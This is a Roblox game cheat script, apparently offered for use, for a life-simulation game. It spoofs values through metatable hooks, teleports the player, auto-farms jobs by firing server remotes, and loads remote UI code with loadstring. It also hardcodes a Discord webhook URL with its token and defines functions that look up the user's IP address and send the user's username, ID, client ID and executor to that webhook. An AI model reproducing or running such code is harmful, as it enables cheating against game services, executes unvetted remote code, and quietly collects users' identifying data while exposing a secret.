--Checks
local UnsupportedClients = {
    "WRD-API"
}


--Embed Anti-Afk
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

for i,v in ipairs(UnsupportedClients) do
    if v == identifyexecutor() then
        warn('Unsupported Executor.')
    end
end

--entity
local entityLib = {
    plr = game.Players.LocalPlayer,
    char = game.Players.LocalPlayer.Character,
    humanoid = game.Players.LocalPlayer.Character.Humanoid,
    root = game.Players.LocalPlayer.Character.HumanoidRootPart,

    tp = function(pos)
        game.Players.LocalPlayer.character:MoveTo(pos)
    end,
    
    getClosestPlayer = function(studs)
        local closestPlayer = nil
        local closestDistance = math.huge
        local myPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local distance = (player.Character.HumanoidRootPart.Position - myPosition).magnitude
                if distance < closestDistance and distance <= studs then
                    closestPlayer = player
                   closestDistance = distance
                end
            end
        end
        return closestPlayer
    end,

    isVictimClose = function(player, studs)
        local myPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (player.Character.HumanoidRootPart.Position - myPosition).magnitude
            return distance <= studs
        end
    
        return false
    end,

    isVictimBehindWall = function(player)
        local myPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
        local targetPosition = player.Character.HumanoidRootPart.Position
    
        local raycastResult = workspace:Raycast(myPosition, targetPosition - myPosition, {player.Character})
    
        return raycastResult and raycastResult.Instance and raycastResult.Instance:IsDescendantOf(workspace) == false
    end
}


local Carmods = {
	Speed = function(Speed)
		local mt = getrawmetatable(game)
   		setreadonly(mt, false)
    	local old_index = mt.__index   
    	mt.__index = function(a,b)
     	   if tostring(a) == "MaxSpeed" then
     	        if tostring(b) == "Value" then
     	           return Speed
      	      end
     	   end
        	return old_index(a,b)
   		end
	end,
	
	ReverseSpeed = function(ReverseSpeed)
		local mt = getrawmetatable(game)
    	setreadonly(mt, false)
    	local old_index = mt.__index   
    	mt.__index = function(a,b)
    	    if tostring(a) == "ReverseSpeed" then
    	         if tostring(b) == "Value" then
    	            return ReverseSpeed
     	       end
     	   end
      	  return old_index(a,b)
    	end
	end,

    Height = function(Height)
        local mt = getrawmetatable(game)
    	setreadonly(mt, false)
    	local old_index = mt.__index   
    	mt.__index = function(a,b)
    	    if tostring(a) == "Height" then
    	         if tostring(b) == "Value" then
    	            return Height
     	       end
     	   end
      	  return old_index(a,b)
    	end
    end,

    Bounce = function(Bounce)
        local mt = getrawmetatable(game)
    	setreadonly(mt, false)
    	local old_index = mt.__index   
    	mt.__index = function(a,b)
    	    if tostring(a) == "Bounce" then
    	         if tostring(b) == "Value" then
    	            return Bounce
     	       end
     	   end
      	  return old_index(a,b)
    	end
    end,

    Suspension = function(Sus)
        local mt = getrawmetatable(game)
    	setreadonly(mt, false)
    	local old_index = mt.__index   
    	mt.__index = function(a,b)
    	    if tostring(a) == "Suspension" then
    	         if tostring(b) == "Value" then
    	            return Sus
     	       end
     	   end
      	  return old_index(a,b)
    	end
    end,

    TurnSpeed = function(trnspeed)
        local mt = getrawmetatable(game)
    	setreadonly(mt, false)
    	local old_index = mt.__index   
    	mt.__index = function(a,b)
    	    if tostring(a) == "TurnSpeed" then
    	         if tostring(b) == "Value" then
    	            return trnspeed
     	       end
     	   end
      	  return old_index(a,b)
    	end
    end,
}



--Variables

local scripter = "Aetheron#8499"
local Cid = game:GetService("RbxAnalyticsService"):GetClientId()
local Plots = game:GetService("Workspace").Properties
local WebhookURL = "https://discord.com/api/webhooks/1133564297180614656/3LACQuZRzjmp19aCLv8XNm9Gk9QBQmC5GtES_MYckGo3GnXzlvINEA4NAP0AIX5PkIP8"

local localPlot = game:GetService("Workspace").Properties[game.Players.LocalPlayer.Name]
local ts = game:GetService("TweenService")
local localCar

local plr = game.Players.LocalPlayer
local stats = plr.Stats

local players = {}

game.Players.PlayerAdded:Connect(function(player)
    table.insert(players, player)
end)

local Discord = 'https://discord.gg/r2jfChC5Sw'



function Noclip(NoClipVal)
    if not NoClipVal then Clipping:Disconnect() return end
    Clipping = game:GetService("RunService").Stepped:Connect(function()
        for i,v in next, game.Players.LocalPlayer.Character:GetChildren() do
            if v:IsA("Part") or v:IsA("BasePart") then
                v.CanCollide = false
            end
        end
    end)
end

function InfJump(Val)
    if not Val then IJ:Disconnect() return end
    IJ = game:GetService("UserInputService").JumpRequest:Connect(function()
        game.Players.LocalPlayer.Character:FindFirstChildOfClass"Humanoid":ChangeState("Jumping")
    end)
end

function ClickTp(val)
    local mouse = game:GetService("Players").LocalPlayer:GetMouse()
    local connection
    if val then
        connection = mouse.Button1Down:Connect(function()
            entityLib.tp(Vector3.new(mouse.hit.p.X, mouse.hit.p.Y, mouse.hit.p.Z))
        end)
    else
        if connection then
            connection:Disconnect()
        end
    end
end

local p = game:GetService("Workspace").PoliceStation.PJobDesks
local b = game:GetService("RunService")

local function c()
    for d, e in pairs(p:GetChildren()) do
        if e.Temp:FindFirstChild("Paper") then
            local f = e.Temp.Paper.S.OFF.Text
            if f == "Theft" or f == "Murder" or f == "Breaking In" then
                fireclickdetector(e.A.C)
            else
                fireclickdetector(e.B.C)
            end
        end
    end
end
local function g()
    for d, e in pairs(p:GetChildren()) do
        if not e.Temp:FindFirstChild("Paper") then
            fireclickdetector(e.Print.C)
        end
    end
end

local function h()
    g()
    c()
end

function PoliceClerkFarm(bool)
    if bool == true then
        b:BindToRenderStep("policeFarm", 1, h)
    else
        b:UnbindFromRenderStep("policeFarm")
    end
end

local function TpToCar()
    local ohInstance1 = workspace.Properties[game.Players.LocalPlayer.Name][game.Players.LocalPlayer.Name..".Vehicle"].DriveSeatModel

    game:GetService("ReplicatedStorage").ActionEvents.Drive:FireServer(ohInstance1)
end

local function TpToHelicopter()
    local ohInstance1 = workspace.Properties[game.Players.LocalPlayer.Name].Helicopter.DriveSeatModel

    game:GetService("ReplicatedStorage").ActionEvents["Drive Helicopter"]:FireServer(ohInstance1)
end

local function TpToPrivateJet()
    local ohInstance1 = workspace.Properties[game.Players.LocalPlayer.Name]["Private Jet"].DriveSeatModel

    game:GetService("ReplicatedStorage").ActionEvents["Fly plane"]:FireServer(ohInstance1)
end

function TpToBasicPlane()
    local ohInstance1 = workspace.Properties[game.Players.LocalPlayer.Name]["Small Plane"].DriveSeatModel

    game:GetService("ReplicatedStorage").ActionEvents["Fly plane"]:FireServer(ohInstance1)
end

local function VehicleTP(VehiclePath,VehiclePrimPart,TpPosition)
    VehiclePath.PrimaryPart = VehiclePath[VehiclePrimPart]
    VehiclePath:SetPrimaryPartCFrame(TpPosition)
end

local function TpCar()
    VehicleTP(localPlot[game.Players.LocalPlayer.Name..".Vehicle"], 'DriveSeat', game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
end

function ModifyStats(Cash, paycheck, bonus, aspiration)
    stats.Cash.Value = Cash
    stats.Paycheck.Value = paycheck
    stats.Bonus.Value = bonus
    
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local old_index = mt.__index   
    mt.__index = function(a,b)
        if tostring(a) == "AspirationPoints" then
             if tostring(b) == "Value" then
                return aspiration
            end
        end
        return old_index(a,b)
    end
end

function SpoofValue(ValueName, ReturningValue)
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local old_index = mt.__index   
    mt.__index = function(a,b)
        if tostring(a) == ValueName then
             if tostring(b) == "Value" then
                return ReturningValue
            end
        end
        return old_index(a,b)
    end
end
function TpHome()
    local Spawn = localPlot.PlotPos.Value
    entityLib.tp(Spawn)
end


function Notify(text)
    local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
    OrionLib:MakeNotification({
        Name = "Axiom",
        Content = text,
        Image = "rbxassetid://4483345998",
        Time = 5
    })
end

function GetIP()
    local ipEchoServiceUrl = "https://ipinfo.io/ip"
    local response = request({
        Url = ipEchoServiceUrl,
        Method = "GET"
    })
    if response.Success then
        return string.gsub(response.Body, "\n", "") -- Remove the newline character
    else
        warn("Failed to get user's IP address: " .. response.StatusCode)
        return nil
    end
end

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    } 
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print(".requested")
end

local AxiomResource = Instance.new("StringValue")
AxiomResource.Name = "Axiom_Resource"
AxiomResource.Parent = game.Players.LocalPlayer
AxiomResource.Value = "mod.PushRequest('Update')"

function Log()
    local ResourceCreted
    if game.Players.LocalPlayer['Axiom_Resource'] then
        ResourceCreted = true
    else
        ResourceCreted = false
    end
    local date = os.date("*t")
    local embed = {
        ["title"] = "Axiom - Execution Log",
        ["description"] = "Join Script:\n```LUA\ngame:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '".. game:GetService("RbxAnalyticsService"):GetClientId().."', game.Players.LocalPlayer)```",
        ["color"] = 65280,
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = game.Players.LocalPlayer.Name
            },
            {
                ["name"] = "User ID",
                ["value"] = game.Players.LocalPlayer.UserId
            },
            {
                ["name"] = "is Axiom_Resource",
                ["value"] = '`'..tostring(ResourceCreted).."`"
            },
            {
                ["name"] = "Client",
                ["value"] = identifyexecutor()
            },

            {
                ["name"] = "Client ID",
                ["value"] = "```"..game:GetService("RbxAnalyticsService"):GetClientId().."```"
            },
        },
        ["footer"] = {
            ["text"] = date.month .. "/" .. date.day .. "/" .. date.year .. " " .. date.hour .. ":" .. date.min .. ":" .. date.sec
        }
    }
    SendMessageEMBED(WebhookURL, embed)
end

local Buy = {
    Explosive = function()
        game:GetService("ReplicatedStorage").CS.BuyExplosives:FireServer()
    end,
    Pearl = function()
        game:GetService("ReplicatedStorage").CS.BuyPearl:FireServer()
    end
}


local function GUI()
    --Gui
    local DiscordLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Aetheronn/Axiom/main/bin/GUI%20Library/source.lua"))()

    local win = DiscordLib:Window("Axiom.lua")
    local function Notif(txt)
        DiscordLib:Notification("Notification", txt, "Okay!")
    end

    local function NotifErr(txt)
        DiscordLib:Notification("Error", txt, "Okay!")
    end

    local serv = win:Server("Axiom - "..getLicense(), "")

    local AutoFarm = serv:Channel("Auto Farm")
    local Job
    getgenv().RocketFarm = false
    getgenv().ArchFarm = false
    getgenv().BankerFarm = false
    getgenv().TeacherFarm = false
    getgenv().CashierFarm = false
    local JobsList = AutoFarm:Dropdown("Select a Job",{"Rocket Engineer", "Archeologist", "Banker", "Police Clerk", "Teacher", "Dinerblox Cashier"}, function(bool)
        Job = bool
    end)
    local JobPos = {
        ['Archeologist'] = Vector3.new(4381.42919921875, -28.87537384033203, 3668.712890625), 
        ["Banker"] = Vector3.new(160.2230224609375, -16.380111694335938, 2026.986083984375), 
        ['Police Clerk'] = Vector3.new(-1361.6356201171875, -19.321308135986328, 1.4428608417510986), 
        ['Teacher'] = Vector3.new(976.2520751953125, -16.31631088256836, 2097.64697265625), 
        ['Dinerblox Cashier'] = Vector3.new(218.48193359375, -19.6005802154541, 1322.994140625),
        ['Rocket Engineer'] = Vector3.new(4435.6162109375, -21.233531951904297, 3984.314697265625),
    }
    AutoFarm:Button("Goto Job", function()
        entityLib.tp(JobPos[Job])
        Notif("Teleported")
    end)

    AutoFarm:Seperator()

    AutoFarm:Toggle("Farm",false, function(bool)
        if bool == false then
            getgenv().RocketFarm = false
            getgenv().ArchFarm = false
            getgenv().BankerFarm = false
            getgenv().TeacherFarm = false
            getgenv().CashierFarm = false
        end
        if Job == "Rocket Engineer" then
            getgenv().RocketFarm = bool
        end
        if Job == "Archeologist" then
            getgenv().ArchFarm = bool
        end
        if Job == "Banker" then
            getgenv().BankerFarm = bool
        end
        if Job == "Police Clerk" then
            PoliceClerkFarm(bool)
        end
        if Job == "Teacher" then
            getgenv().TeacherFarm = bool
        end
        if Job == "Dinerblox Cashier" then
            getgenv().CashierFarm = bool
        end
    end)

    local Plot = serv:Channel("Plot")
    local PlotCode
    Plot:Textbox("Plot Code", "Enter Code", true, function(t)
        PlotCode = t
        if PlotCode == nil then
            Notif("You have to enter a plot code.")
        end
    end)

    Plot:Button("Load", function()
        if PlotCode == nil then
            Notif("You have to enter a plot code.")
        else
            local ohString1 = PlotCode

            game:GetService("ReplicatedStorage").MarketplaceEvents.PurchaseProperty:FireServer(ohString1)
            Notif("Loaded.")
        end
    end)

    Plot:Button("Force Bulldoze", function()
        game:GetService("ReplicatedStorage").BuildingEvents.BulldozePlot:FireServer()
        Notif("Bulldozed")
    end)

    Plot:Seperator()
    local PropertyName
    Plot:Textbox("Property Name", game.Players.LocalPlayer.Name.."'s residence", true, function(t)
        PropertyName = t
        if PropertyName == nil then
            Notif("You have to enter a plot code.")
        end
    end)

    Plot:Button("Load", function()
        if PropertyName == nil then
            Notif("You have to enter a plot code.")
        else
        local ohString1 = PropertyName
        local ohInstance2 = localPlot

        game:GetService("ReplicatedStorage").CS.SaveSlotData:FireServer(ohString1, ohInstance2)
            Notif("Loaded.")
        end
    end)
--[[
    local Automatic = serv:Channel("Automatic")
    local Beds = {
        "Classic Double Bed",
        "Modern Double Bed",
        "Sleek Master Bed",
        'Bed',
        'King Sized Simpilicstic Bed',
        'Bunk Bed',
        'Modern Stylish Bed',
        'Modern Stylish King-Sized Bed',
        'Baby Cradle',
        'Opera Victorian Bed',
        'Minimalist Modern Bed',
        'Coffin Bed',
        'Generic Wooden Double Bed',
        'Minimalistic Wooden Double Bed',
        'Modern Artistic Double Bed'
    }
    local Hygiene = {
        'Simple Shower',
        'Bathtub Shower',
        'Standard Shower',
        'Modern Bathtub',
        'Standard Bathtub',
        'Wall-attached shower head'
    }

    local Build = localPlot.Builds 
    ]]
    local buy = serv:Channel("Buy")
    local item
    local itemstobuy = buy:Dropdown("Select a Item to buy",{'Explosives', 'Pearl'}, function(items)
        item=items
    end)
    buy:Button("Purchase", function()
        if item == "Explosives" then
            Buy.Explosive()
        elseif item == "Pearl" then
            Buy.Pearl()
        else
            NotifErr("No item chosen.")
        end
    end)
    local vehicle = serv:Channel("Vehicle")
    local vehiclestotp = vehicle:Dropdown("Select a Vehicle to tp to",{'Car', 'Helicopter', 'Private Jet', 'Small Plane'}, function(veh)
        if veh == 'Car' then
            TpToCar()
        elseif veh == 'Helicopter' then
            TpToHelicopter()
        elseif veh == 'Private Jet' then
            TpToPrivateJet()
        elseif veh == 'Small Plane' then
            TpToBasicPlane()
        end
    end)
    vehicle:Seperator()
    vehicle:Button("Bring Car", function()
        TpCar()
        Notif("Brought Car")
    end)

    vehicle:Seperator()
    local Speed
    local ReverseSpeed
    local TurnSpeed
    local Height
    local Suspension
    local Bounce
    vehicle:Textbox("Vehicle Speed",50, true, function(t)
        Carmods.Speed(tonumber(t))
        Notif("Modded Speed")
    end)
    vehicle:Textbox("Reverse Speed",50, true, function(t)
        Carmods.ReverseSpeed(tonumber(t))
        Notif("Modded Reverse Speed")
    end)
    vehicle:Textbox("Turn Speed",50, true, function(t)
        Carmods.TurnSpeed(tonumber(t))
        Notif("Modded Turn Speed")
    end)
    vehicle:Textbox("Height",50, true, function(t)
        Carmods.Height(tonumber(t))
        Notif("Modded Height")
    end)
    vehicle:Textbox("Bounce",50, true, function(t)
        Carmods.Bounce(tonumber(t))
        Notif("Modded Bounce")
    end)

    vehicle:Textbox("Suspension",50, true, function(t)
        Carmods.Suspension(tonumber(t))
        Notif("Modded Suspension")
    end)
    


    local auto = serv:Channel("Automatic")
    getgenv().SelectedCrate = nil
    local cratelist = auto:Dropdown("Select a Crate to Open",{'Common Crate', 'Uncommon Crate', 'Rare Crate', 'Mythical Crate'}, function(crate)
        getgenv().SelectedCrate = crate
    end)
    auto:Toggle("Auto Open Crates",false, function(bool)
        getgenv().AutoOpenCrates = bool
    end)



    local PlotC = localPlot.PSpawn.Position
    local tps = serv:Channel("Teleports")
    local SavedPosition
    tps:Button("Save Position", function()
        SavedPosition = entityLib.root.Position
        Notif("Saved Position")
    end)
    tps:Button("Teleport", function()
        if SavedPosition ~= nil then
            entityLib.tp(SavedPosition)
        else
            NotifErr("Position has not been saved.")
        end
        
    end)
    tps:Seperator()
    local PlrName 
    tps:Button("To Plot", function()
        entityLib.tp(PlotC)
    end)
    tps:Seperator()
    local waypoints = {['Car Dealership'] = Vector3.new(-1093.250732421875, -19.283016204833984, 28.989116668701172), ['Boat Dealership'] = Vector3.new(409.3240051269531, -18.53731918334961, 87.19258880615234), ['Airport'] = Vector3.new(3818.22900390625, -21.083541870117188, 2680.879150390625), ['School'] = Vector3.new(974.6366577148438, -16.21630859375, 2095.189453125), ['Lighthouse'] = Vector3.new(347.16485595703125, 172.69857788085938, 4368.7138671875), ['Aspiration Store'] = Vector3.new(893.1939086914062, -19.040145874023438, 1098.94384765625), ['Personal Statue Island'] = Vector3.new(-176.9307403564453, -13.129636764526367, -2245.77490234375)}
    local waypointlist = tps:Dropdown("Select a Waypoint [Fast Bypassed TP]",{'Car Dealership', 'Boat Dealership', 'Airport', 'School', 'Lighthouse', 'Personal Statue Island', 'Aspiration Store'}, function(point)
        entityLib.tp(waypoints[point])
    end)
        
    local Misc = serv:Channel("Miscellaneous")
    Misc:Toggle("Noclip",false, function(bool)
        Noclip(bool)
    end)
    Misc:Toggle("Infinite Jump",false, function(bool)
        InfJump(bool)
    end)

    Misc:Seperator()
    local Grocs
    Misc:Textbox("Amount Of Groceries", 50, true, function(t)
        Grocs = tostring(t)
    end)

    Misc:Button("Deliver Groceries", function()
        game:GetService("ReplicatedStorage").CS.DeliverGroceries:FireServer(Grocs)
        Notif("Delivered Groceries.")
    end)

    Misc:Seperator()

    --Get
    Misc:Button("Brew Coffee", function()
        game:GetService("ReplicatedStorage").CS.Brew:FireServer()
    end)
    Misc:Button("Get Cupcake", function()
        local ohInstance1 = workspace.Model

        game:GetService("ReplicatedStorage").ActionEvents["Buy cupcake - $30"]:FireServer(ohInstance1)
    end)


--[[
    local fun = serv:Channel("Fun")
    local Stats = game.Players.LocalPlayer.Stats
    local Cash = Stats.Cash
    local PayCheck = Stats.Paycheck
    local Bonus = Stats.Bonus
    local Aspiration = game.Players.LocalPlayer.AspirationPoints
    fun:Textbox("Fake Cash", Cash.Value, function(t)
        Cash.Value = tonumber(t)
        Notif("Modded")
    end)
    fun:Textbox("Fake Pay Check", PayCheck.Value, true, function(t)
        PayCheck.Value = tonumber(t)
    end)
    fun:Textbox("Fake Bonus", Bonus.Value, true, function(t)
        Bonus.Value = tonumber(t)
    end)
    fun:Textbox("Fake Aspiration Points", Aspiration.Value, true, function(t)
        SpoofValue("AspirationPoints", tonumber(t))
    end)
    ]]
    
end

GUI()

while true do
    task.wait(0.1)
    if getgenv().AutoOpenCrates == true then
        local ohInstance1 = game:GetService("ReplicatedStorage").Crates[getgenv().SelectedCrate]
	    game:GetService("ReplicatedStorage").CS.BuyCrate:InvokeServer(ohInstance1)
    end
    if getgenv().RemoveStinkEffect == true then
        entityLib.char.UpperTorso.Stink:Destroy()
    end
    if getgenv().RocketFarm == true then
        local PartBoard = game:GetService("Workspace").RocketEngineer.PartBoard
        local Ltr = "A"

        function GetPart(Letter,Color)
            local ohString1 = "Part"..Letter
            local ohString2 = Color
            local ohBoolean3 = true

            game:GetService("ReplicatedStorage").ActionEvents["Grab parts"]:FireServer(ohString1, ohString2, ohBoolean3)
        end

        function GetPart2(Letter,Color)
            local ohString1 = "Part"..Letter
            local ohString2 = Color
            local ohBoolean3 = false

            game:GetService("ReplicatedStorage").ActionEvents["Grab parts"]:FireServer(ohString1, ohString2, ohBoolean3)
        end

        function Assemble()
            local ohInstance1 = workspace.RocketEngineer.AssembleBox
            game:GetService("ReplicatedStorage").ActionEvents["Assemble Part"]:FireServer(ohInstance1)
        end

        local Engine = PartBoard.Board['EngineFrame']
        local Rocket = PartBoard.Board['RocketFrame']

        local Delay = 2.75
        local Delay2 = 1.75

        wait(1)
        GetPart(Ltr, Engine["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(Delay)
        Ltr="B"
        GetPart(Ltr, Engine["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(Delay)
        Ltr="C"
        GetPart(Ltr, Engine["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(Delay)
        Ltr="D"
        GetPart(Ltr, Engine["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(Delay)
        Ltr="E"
        GetPart(Ltr, Engine["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(Delay)
        Ltr="F"
        GetPart(Ltr, Engine["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(3.5)

        --Rocket
        Ltr="A"
        GetPart2(Ltr, Rocket["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(Delay)
        Ltr="B"
        GetPart2(Ltr, Rocket["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(Delay)
        Ltr="C"
        GetPart2(Ltr, Rocket["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(Delay)
        Ltr="D"
        GetPart2(Ltr, Rocket["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(Delay)
        Ltr="E"
        GetPart2(Ltr, Rocket["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(Delay)
        Ltr="F"
        GetPart2(Ltr, Rocket["Part"..Ltr].clrText.Text)
        wait(Delay2)
        Assemble()
        wait(5)
    end

    if getgenv().TeacherFarm == true then
        local Workspace = game:GetService("Workspace")
        local Players = game:GetService("Players")
        
        local Player = Players.LocalPlayer
        
        local Closest = nil
        local Right = nil
        local Wrong = nil
        local Question_Raw = nil
        local Distance = 50
        for _, A_1 in next, Workspace:GetChildren() do
            local R = A_1:FindFirstChild("R")
            if R and A_1:FindFirstChild("Q", true) then
                local Player_Distance = Player:DistanceFromCharacter(R.Position)
                if Player_Distance < Distance then
                    Closest = A_1
                    Distance = Player_Distance
                end
            end
        end
        
        if Closest == nil then
        else
            Right = Closest:WaitForChild("R")
            Wrong = Closest:WaitForChild("W")
            Question_Raw = Closest:FindFirstChild("Q", true)
        end
        
        if getgenv().Hooked ~= true then
            getgenv().Hooked = true
            local Old;
            Old = hookfunction(getrawmetatable(game).__namecall, function(...)
                local Method = getnamecallmethod()
                local Args = {...}
                if Method == "FireServer" and tostring(Args[1]) == "CursorUpdate" then
                    Args[2] = true
                end
                return Old(unpack(Args))
            end)
        end
        
        while Player:DistanceFromCharacter(Right.Position) <= 10  do
            local Question_Split = Question_Raw.Text:split(" = ")
            local Question_Answer = Question_Split[2]
            local Question_CorrectAnswer = loadstring(
                "return " .. Question_Split[1]
            )()
        
            if Question_Answer == tostring(Question_CorrectAnswer) then
                fireclickdetector(Right:FindFirstChildOfClass("ClickDetector"))
            else
                fireclickdetector(Wrong:FindFirstChildOfClass("ClickDetector"))
            end
        
            Question_Raw.Changed:wait()
            repeat
                wait()
            until #Question_Raw.Text > 1
        end
    end
    if getgenv().ArchFarm == true then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Excevation.GetCompass.Part.CFrame
        wait(2)

        local args = {
            [1] = workspace.Excevation.GetCompass
        }
        game:GetService("ReplicatedStorage").ActionEvents["Get compass"]:FireServer(unpack(args))
        wait(.5)

        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Excevation.DigArea.BASE.CFrame
        wait(.5)

         local args = {
            [1] = workspace.Excevation.DigArea.DigArea
        }
        game:GetService("ReplicatedStorage").ActionEvents.Excevate:FireServer(unpack(args))
        wait(6)

        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Excevation.CleanArea.CF.CFrame
        wait(2)

        local args = {
            [1] = workspace.Excevation.CleanArea.CleanItem
        }
        game:GetService("ReplicatedStorage").ActionEvents["Clean bones"]:FireServer(unpack(args))
        wait(6)

        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Excevation.Package.Part.CFrame
        wait(2)
        
        local args = {
            [1] = workspace.Excevation.Package
        }
        game:GetService("ReplicatedStorage").ActionEvents.Package:FireServer(unpack(args))
        wait(3)
    end

    if getgenv().CashierFarm == true then
        local player = game.Players.LocalPlayer

        local cashiers = {}
        local stuff = workspace:GetDescendants()
        for i = 1, #stuff do local v = stuff[i]
            if v.Name == "Cashier" then
                table.insert(cashiers, v)
            end
        end


        for _ = 1, 3 do
            for i,v in pairs(cashiers[_].Customers:GetChildren()) do
                if v:FindFirstChild("ChoiceShow") then
                    if string.find(v.ChoiceShow.TextLabel.Text, "Fries") then
                        player.Character:MoveTo(cashiers[_].QSpot.Position)
                        wait(player:DistanceFromCharacter(cashiers[_].QSpot.Position)/player.Character.Humanoid.WalkSpeed+1)
                        fireclickdetector(cashiers[_].Choices["Bloxy Fries"].ClickDetector, 1)
                    elseif string.find(v.ChoiceShow.TextLabel.Text, "Cola") then
                        player.Character:MoveTo(cashiers[_].QSpot.Position)
                        wait(player:DistanceFromCharacter(cashiers[_].QSpot.Position)/player.Character.Humanoid.WalkSpeed+1)
                        fireclickdetector(cashiers[_].Choices["Bloxy Cola"].ClickDetector, 1)
                    elseif string.find(v.ChoiceShow.TextLabel.Text, "Burger") then
                        player.Character:MoveTo(cashiers[_].QSpot.Position)
                        wait(player:DistanceFromCharacter(cashiers[_].QSpot.Position)/player.Character.Humanoid.WalkSpeed+1)
                        fireclickdetector(cashiers[_].Choices["Bloxy Burger"].ClickDetector, 1)
                    end
                    wait(1)
                end
            end
        end
    end

    if getgenv().BankerFarm == true then
        local player = game.Players.LocalPlayer
        local job

        for i,v in pairs(workspace.Bank.BankerJob:GetChildren()) do
            if v:IsA("Model") and player:DistanceFromCharacter(v.Amm.Position) < 6 then
                job = v
            end
        end


        for i,v in pairs(job.Customers:GetChildren()) do
            if pcall(function() return v.ChoiceShow.TextLabel.Text end) then
                local choice = v.ChoiceShow
                local amount = string.split(choice.TextLabel.Text, "$")[2]
                local mm = tick()
                repeat
                    pcall(function()
                        fireclickdetector(job.Nums[amount].ClickDetector, 1)
                    end)
                    task.wait(.25)
                until job.Amm.SurfaceGui.TextLabel.Text == "$"..amount or tick() - mm > 2
                if string.find(choice.TextLabel.Text:lower(), "deposit") then
                    fireclickdetector(job.Choices.Deposit.CD, 1)
                else
                    fireclickdetector(job.Choices.Withdraw.CD, 1)
                end
                task.wait(.7)
            end
        end
    end


end